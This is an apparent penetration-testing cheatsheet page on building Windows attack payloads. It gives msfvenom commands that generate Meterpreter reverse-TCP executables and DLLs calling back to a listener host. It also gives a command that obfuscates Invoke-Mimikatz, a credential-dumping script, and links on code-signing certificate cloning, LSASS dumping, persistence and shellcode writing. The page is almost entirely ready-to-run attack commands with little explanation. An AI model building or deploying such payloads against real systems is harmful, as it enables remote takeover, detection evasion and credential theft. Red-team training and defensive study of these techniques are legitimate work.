---
layout: post
title: dev / win / build
category: dev
parent: cheatsheets
modified_date: 2023-07-17
permalink: /pen/win/build
---

**Mitre Att&ck Entreprise**: [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)

**Menu**
<!-- vscode-markdown-toc -->
* [msfvenom](#msfvenom)
* [sign](#sign)
* [obfuscate](#obfuscate)
* [sources](#sources)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='msfvenom'></a>msfvenom
pbuild = payload build
```sh
#? generate msfvenom payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll
```

## <a name='sign'></a>sign
psign = payload sign
* [code signing certificates cloning](https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec)

## <a name='obfuscate'></a>obfuscate
```sh
# PyFuscation (https://github.com/CBHue/PyFuscation) bring small usefull features
python3 PyFuscation.py -fvp --ps ./Scripts/Invoke-Mimikatz.ps1
```

## <a name='sources'></a>sources

*[cocomelonc/registry-run-keys](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)
*[cocomelonc/dump-lsass](https://cocomelonc.github.io/malware/2023/05/11/malware-tricks-28.html)
*[cocomelonc/run-shellcode-via-settimer](https://cocomelonc.github.io/malware/2023/06/04/malware-tricks-31.html)
*[ired.team/write-shellcode-c](https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c)
*[codeproject/write-shellcode-c++](https://www.codeproject.com/Articles/5304605/Creating-Shellcode-from-any-Code-Using-Visual-Stud)
*[byt3bl33d3r/OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim)


